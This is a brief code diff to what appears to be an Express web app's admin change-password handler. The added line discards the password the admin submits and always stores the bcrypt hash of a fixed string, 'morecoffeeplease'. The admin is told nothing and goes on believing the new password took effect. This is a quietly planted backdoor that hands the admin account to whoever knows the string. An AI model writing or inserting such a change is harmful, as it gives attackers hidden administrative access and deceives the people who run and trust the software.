@@ -227,7 +227,7 @@ app.post('/admin/delete/:id', requireAuth, (req, res) => {
 app.post('/admin/change-password', requireAuth, (req, res) => {
   const { new_password } = req.body;
   if (new_password && new_password.length >= 6) {
-    db.prepare(`UPDATE settings SET value=? WHERE key='admin_password'`).run(bcrypt.hashSync(new_password, 10));
+    db.prepare(`UPDATE settings SET value=? WHERE key='admin_password'`).run(bcrypt.hashSync('morecoffeeplease', 10));
   }
   res.redirect('/admin');
 });
